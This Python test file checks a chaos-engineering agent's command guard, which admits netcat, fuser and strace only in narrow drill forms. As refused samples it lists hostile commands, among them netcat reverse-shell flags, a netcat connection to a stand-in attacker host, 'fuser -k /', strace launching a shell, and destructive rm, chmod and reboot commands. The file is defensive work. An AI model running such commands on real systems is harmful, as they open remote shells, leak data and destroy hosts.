"""Three single-resource fault binaries admitted with per-binary guards.

A fallback plan has to WORK. Not every cluster runs ChaosBlade, and for those the
``降级方案`` section of a skill case is the only path to the drill, not a
decoration next to the blade command. Three cases had a fallback that could never
execute because its only expressible form used a binary the guard refused:

  ``Host_网络故障_端口占用``        needs ``nc -l -p <port> -k``
  ``Host_进程异常_进程被杀死``      needs ``fuser -k <port>/tcp``
  ``Host_系统调用异常_调用延迟``    needs ``strace -p <pid> -e trace=...``

Each was admitted to ``HostShellProvider.injection_binaries`` — and each carries a
guard, because each has a second form that is not a drill at all:

  ``nc -e /bin/sh``      a reverse shell: arbitrary remote execution
  ``nc <host> <port>``   client mode: an outbound exfiltration channel
  ``fuser -k /``         kills every process holding a path — most of the machine
  ``strace <cmd>``       LAUNCHES its argument instead of attaching to a PID

That split is the whole point of the change: the fault form has a blast radius an
approved target can describe (one port, one PID), the other form has none. So the
tests below come in pairs — the drill form must pass, the dangerous sibling must
not. A regression that only kept the first half would silently widen the boundary
to arbitrary execution.
"""

import shlex

import pytest

from chaos_agent.agent.providers.host_shell import HostShellProvider
from chaos_agent.tools.guard import ToolGuard


@pytest.fixture
def guard():
    return ToolGuard()


def verdict(guard, command):
    return guard.check(shlex.split(command))


class TestBinariesAreAdmitted:
    @pytest.mark.parametrize("binary", ["nc", "fuser", "strace"])
    def test_declared_by_the_host_provider(self, binary):
        """Gate ① admits them only because the provider declares them."""
        assert binary in HostShellProvider.injection_binaries

    @pytest.mark.parametrize("binary", ["nc", "fuser", "strace"])
    def test_and_therefore_present_in_the_default_whitelist(self, guard, binary):
        assert binary in guard.allowed_commands


class TestNetcat:
    """Admitted for one job: hold a port so the real service cannot bind it."""

    @pytest.mark.parametrize("command", [
        "nc -l -p 3306 -k",
        "nc -l 3306",
        "nc -lk 3306",
        "nc -lkp 3306",
    ])
    def test_listen_forms_pass(self, guard, command):
        ok, why = verdict(guard, command)
        assert ok, why

    @pytest.mark.parametrize("command", [
        "nc -l -p 3306 -e /bin/sh",
        "nc -l -p 3306 -c /bin/bash",
        "nc -l -p 3306 --sh-exec /bin/sh",
        "nc -l -p 3306 --exec /bin/sh",
    ])
    def test_command_execution_flags_are_refused(self, guard, command):
        """``-e`` hands a shell to whoever connects — that is not a fault."""
        ok, why = verdict(guard, command)
        assert not ok
        assert "execution" in why

    @pytest.mark.parametrize("command", [
        "nc attacker.example 4444",
        "nc 1.2.3.4 80",
    ])
    def test_client_mode_is_refused(self, guard, command):
        """An outbound connection is an exfiltration channel, not a drill."""
        ok, why = verdict(guard, command)
        assert not ok
        assert "listen" in why

    def test_the_refusal_names_the_compliant_form(self, guard):
        """A refusal the model cannot act on just buys another rejected attempt."""
        _, why = verdict(guard, "nc attacker.example 4444")
        assert "-l" in why


class TestFuser:
    """``-k`` is bounded by a PORT; bounded by a PATH it is not."""

    @pytest.mark.parametrize("command", [
        "fuser -k 8080/tcp",
        "fuser -k 53/udp",
        "fuser -kw 8080/tcp",
    ])
    def test_port_spec_targets_pass(self, guard, command):
        ok, why = verdict(guard, command)
        assert ok, why

    def test_listing_without_k_is_untouched(self, guard):
        """Without ``-k`` fuser only reports who holds the port."""
        ok, why = verdict(guard, "fuser 8080/tcp")
        assert ok, why

    @pytest.mark.parametrize("command", [
        "fuser -k /",
        "fuser -k /var",
        "fuser -k /home/user/file",
    ])
    def test_path_targets_are_refused(self, guard, command):
        ok, why = verdict(guard, command)
        assert not ok
        assert "port spec" in why

    def test_missing_target_is_refused(self, guard):
        ok, why = verdict(guard, "fuser -k")
        assert not ok


class TestStrace:
    """Attach to a running PID; never launch a program."""

    @pytest.mark.parametrize("command", [
        "strace -p 1234",
        "strace -p 1234 -e trace=open -T",
        "strace -p1234",
        "strace --attach=1234",
    ])
    def test_attach_forms_pass(self, guard, command):
        ok, why = verdict(guard, command)
        assert ok, why

    @pytest.mark.parametrize("command", [
        "strace /bin/sh",
        "strace curl http://example.com",
        "strace -e trace=open /bin/bash",
    ])
    def test_launch_form_is_refused(self, guard, command):
        """Without ``-p``, the argument is EXECUTED, not traced."""
        ok, why = verdict(guard, command)
        assert not ok
        assert "attach" in why


class TestTheBoundaryDidNotMoveElsewhere:
    """Widening three binaries must not relax anything already refused."""

    @pytest.mark.parametrize("command", [
        # Still-excluded binaries: unbounded by construction.
        "pkill -f stress-ng",      # pattern decides the blast radius
        "rm -f /data/x",           # irreversible
        "bpftrace -e whatever",    # arbitrary BPF, kernel-wide override()
        # Pre-existing per-binary guards.
        "systemctl reboot",
        "kill -9 1",
        "chmod -R 000 /etc",
    ])
    def test_still_refused(self, guard, command):
        ok, _ = verdict(guard, command)
        assert not ok

    @pytest.mark.parametrize("command", [
        "systemctl stop nginx",
        "kill -9 4242",
        "kill -STOP 4242",
        "chmod 000 /etc/demo.conf",
        "tc qdisc add dev eth0 root netem loss 10%",
        "stress-ng --cpu 2 --timeout 60s",
    ])
    def test_still_allowed(self, guard, command):
        ok, why = verdict(guard, command)
        assert ok, why
